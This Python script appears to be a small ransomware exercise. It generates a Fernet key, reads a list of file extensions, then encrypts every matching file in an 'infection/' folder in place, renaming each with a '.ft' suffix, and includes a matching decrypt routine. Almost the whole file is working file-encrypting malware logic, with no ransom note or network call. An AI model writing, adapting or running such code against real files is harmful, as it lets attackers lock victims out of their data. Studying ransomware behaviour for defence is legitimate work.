import sys
import os
from cryptography.fernet import Fernet

infected = "infection/"

def decryptfile(file):
    if file.endswith(".ft"):
        file = file[:-3]
    else:
        return
    with open('filekey.key', 'rb') as filekey:
        key = filekey.read()
    fernet = Fernet(key)
    with open(file + ".ft", 'rb') as enc_file:
        encrypted = enc_file.read()
    decrypted = fernet.decrypt(encrypted)
    with open(file, 'wb') as dec_file:
        dec_file.write(decrypted)

def generatefilekey():
    key = Fernet.generate_key() # 44 characters
    with open('filekey.key', 'wb') as filekey:
        filekey.write(key)

def encrypt_file(file_path):
    renamedfile = file_path
    if not renamedfile.endswith(".ft"):
        renamedfile = renamedfile + ".ft"
        os.rename(file_path, renamedfile)
    with open('filekey.key', 'rb') as filekey:
        key = filekey.read()
    fernet = Fernet(key)
    with open(renamedfile, 'rb') as file_to_encrypt:
        original = file_to_encrypt.read()
    encrypted = fernet.encrypt(original)
    with open(renamedfile, 'wb') as encrypted_file:
        encrypted_file.write(encrypted)

def get_ext(file):
    if os.path.exists(file):
        with open(file, 'r') as file:
            extensions = [line.strip() for line in file]
        return extensions
    else:
        print(f"Error: '{file}' not found.")
        return None

def getfiles():
    ext_tab = get_ext("extensions.txt")
    if ext_tab is not None:
        if os.path.exists(infected):
            for file in os.listdir(infected):
                path = os.path.join(infected, file)
                if any(file.endswith(ext) for ext in ext_tab) and os.path.isfile(path):
                    encrypt_file(path)
        else:
            print(f"Error: Directory '{infected}' not found.")
    else:
        return

def main():
    generatefilekey()
    getfiles()
if __name__ == "__main__":
    main()